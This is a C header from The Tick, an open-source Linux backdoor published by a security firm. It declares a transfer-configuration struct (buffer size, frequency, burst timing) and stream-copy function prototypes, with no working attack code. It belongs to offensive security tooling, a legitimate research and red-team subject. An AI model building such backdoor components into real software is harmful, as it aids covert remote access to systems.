/*
 * The Tick, a Linux embedded backdoor.
 * 
 * Released as open source by NCC Group Plc - http://www.nccgroup.com/
 * Developed by Mario Vilas, mario.vilas@nccgroup.com
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#ifndef FILE_H
#define FILE_H

#include <sys/types.h>
#include <cjson/cJSON.h>

typedef struct {
    int bufferSize;
    int transferFrequency;
    int burstDuration;
    int burstPause;
} config_t;

// Function pointer to retrieve config
typedef const config_t* (*get_config_fn_t)(void);

const config_t* get_shared_config(void);
char* get_current_config();
int configurable_copy_stream(int source, int destination, ssize_t count, get_config_fn_t get_config);
int copy_stream(int source, int destination, ssize_t count);

#endif /* FILE_H */
